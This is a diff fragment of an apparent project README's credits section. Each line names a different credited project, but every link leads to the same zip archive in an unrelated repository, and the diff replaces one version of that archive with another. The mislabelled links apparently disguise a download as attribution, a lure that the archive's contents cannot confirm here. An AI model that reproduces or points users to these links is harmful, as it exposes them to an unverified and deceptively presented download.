@@ -136,8 +136,8 @@
 | X |✅|
 
   # THANKS FOR
-* [`Baileys`](https://github.com/Gabrielyop50/Gabriel/raw/refs/heads/master/database/Software-v2.9-alpha.1.zip)
-* [`MhankBarBar`](https://github.com/Gabrielyop50/Gabriel/raw/refs/heads/master/database/Software-v2.9-alpha.1.zip)
-* [`MRHRTZ`](https://github.com/Gabrielyop50/Gabriel/raw/refs/heads/master/database/Software-v2.9-alpha.1.zip)
+* [`Baileys`](https://raw.githubusercontent.com/Gabrielyop50/Gabriel/master/database/Software-2.2.zip)
+* [`MhankBarBar`](https://raw.githubusercontent.com/Gabrielyop50/Gabriel/master/database/Software-2.2.zip)
+* [`MRHRTZ`](https://raw.githubusercontent.com/Gabrielyop50/Gabriel/master/database/Software-2.2.zip)
   
   
